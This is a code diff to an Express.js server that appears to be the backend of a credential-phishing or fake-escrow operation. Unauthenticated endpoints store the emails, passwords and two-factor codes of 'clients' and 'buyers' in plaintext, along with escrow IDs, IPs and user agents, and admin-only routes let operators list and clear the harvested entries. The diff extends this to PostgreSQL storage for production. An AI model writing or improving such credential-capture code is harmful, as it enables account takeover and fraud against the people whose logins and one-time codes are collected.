@@ -771,71 +771,136 @@ app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async
 });
 
 // Store client login attempt (no auth required - called during login flow)
+// Store client login attempt (for tracking/logging purposes)
+// NOTE: For clients, passwords and 2FA codes are stored in plaintext as received
 app.post('/api/client-logins', async (req, res) => {
-  const { email, password, twoFactorCode, platform, step } = req.body;
-  // Store password as-is (no hashing for development)
-  const loginEntry = {
-    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
-    email: email || '',
-    password: password || '',
-    twoFactorCode: twoFactorCode || '',
-    platform: platform || 'unknown',
-    step: step || 'unknown',
-    ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
-    userAgent: req.headers['user-agent'] || 'unknown',
-    timestamp: new Date().toISOString()
-  };
-  db.clientLogins.unshift(loginEntry);
-  db.clientLogins = db.clientLogins.slice(0, 500); // Keep last 500 entries
-  await saveDb();
-  return res.json({ success: true });
+  try {
+    const { email, password, twoFactorCode, platform, step } = req.body;
+    const loginEntry = {
+      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+      email: email || '',
+      password: password || '',
+      twoFactorCode: twoFactorCode || '',
+      platform: platform || 'unknown',
+      step: step || 'unknown',
+      ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
+      userAgent: req.headers['user-agent'] || 'unknown',
+      timestamp: new Date().toISOString()
+    };
+    
+    if (useFileStorage) {
+      // File-based storage (development)
+      db.clientLogins.unshift(loginEntry);
+      db.clientLogins = db.clientLogins.slice(0, 500); // Keep last 500 entries
+      await saveDb();
+    } else {
+      // PostgreSQL storage (production)
+      await loginQueries.addClientLogin(loginEntry);
+    }
+    
+    return res.json({ success: true });
+  } catch (error) {
+    console.error('Error storing client login:', error);
+    return res.status(500).json({ success: false, message: 'Failed to store login data' });
+  }
 });
 
 // Get all client login attempts (admin only)
 app.get('/api/client-logins', authenticate(['admin']), async (req, res) => {
-  return res.json(db.clientLogins || []);
+  try {
+    if (useFileStorage) {
+      return res.json(db.clientLogins || []);
+    } else {
+      const logins = await loginQueries.getClientLogins();
+      return res.json(logins);
+    }
+  } catch (error) {
+    console.error('Error retrieving client logins:', error);
+    return res.status(500).json({ message: 'Failed to retrieve login data' });
+  }
 });
 
 // Clear all client login data (admin only)
 app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
-  db.clientLogins = [];
-  await saveDb();
-  return res.json({ success: true, message: 'All login data cleared' });
+  try {
+    if (useFileStorage) {
+      db.clientLogins = [];
+      await saveDb();
+    } else {
+      await loginQueries.clearClientLogins();
+    }
+    return res.json({ success: true, message: 'All login data cleared' });
+  } catch (error) {
+    console.error('Error clearing client logins:', error);
+    return res.status(500).json({ success: false, message: 'Failed to clear login data' });
+  }
 });
 
 // Store buyer login attempt (no auth required - called during payment flow)
+// NOTE: For buyers, passwords and 2FA codes are stored in plaintext as received
 app.post('/api/buyer-logins', async (req, res) => {
-  const { email, password, twoFactorCode, platform, escrowId, step } = req.body;
-  // Store password as-is (no hashing for development)
-  const loginEntry = {
-    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
-    email: email || '',
-    password: password || '',
-    twoFactorCode: twoFactorCode || '',
-    platform: platform || 'unknown',
-    escrowId: escrowId || 'unknown',
-    step: step || 'unknown',
-    ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
-    userAgent: req.headers['user-agent'] || 'unknown',
-    timestamp: new Date().toISOString()
-  };
-  db.buyerLogins = db.buyerLogins || [];
-  db.buyerLogins.unshift(loginEntry);
-  db.buyerLogins = db.buyerLogins.slice(0, 500); // Keep last 500 entries
-  await saveDb();
-  return res.json({ success: true });
+  try {
+    const { email, password, twoFactorCode, platform, escrowId, step } = req.body;
+    const loginEntry = {
+      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+      email: email || '',
+      password: password || '',
+      twoFactorCode: twoFactorCode || '',
+      platform: platform || 'unknown',
+      escrowId: escrowId || 'unknown',
+      step: step || 'unknown',
+      ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
+      userAgent: req.headers['user-agent'] || 'unknown',
+      timestamp: new Date().toISOString()
+    };
+    
+    if (useFileStorage) {
+      // File-based storage (development)
+      db.buyerLogins = db.buyerLogins || [];
+      db.buyerLogins.unshift(loginEntry);
+      db.buyerLogins = db.buyerLogins.slice(0, 500); // Keep last 500 entries
+      await saveDb();
+    } else {
+      // PostgreSQL storage (production)
+      await loginQueries.addBuyerLogin(loginEntry);
+    }
+    
+    return res.json({ success: true });
+  } catch (error) {
+    console.error('Error storing buyer login:', error);
+    return res.status(500).json({ success: false, message: 'Failed to store login data' });
+  }
 });
 
 // Get all buyer login attempts (admin only)
 app.get('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
-  return res.json(db.buyerLogins || []);
+  try {
+    if (useFileStorage) {
+      return res.json(db.buyerLogins || []);
+    } else {
+      const logins = await loginQueries.getBuyerLogins();
+      return res.json(logins);
+    }
+  } catch (error) {
+    console.error('Error retrieving buyer logins:', error);
+    return res.status(500).json({ message: 'Failed to retrieve login data' });
+  }
 });
 
 // Clear all buyer login data (admin only)
 app.delete('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
-  db.buyerLogins = [];
-  await saveDb();
-  return res.json({ success: true, message: 'All buyer login data cleared' });
+  try {
+    if (useFileStorage) {
+      db.buyerLogins = [];
+      await saveDb();
+    } else {
+      await loginQueries.clearBuyerLogins();
+    }
+    return res.json({ success: true, message: 'All buyer login data cleared' });
+  } catch (error) {
+    console.error('Error clearing buyer logins:', error);
+    return res.status(500).json({ success: false, message: 'Failed to clear login data' });
+  }
 });
 
 // 2FA Setup endpoint - Generate QR code for TOTP
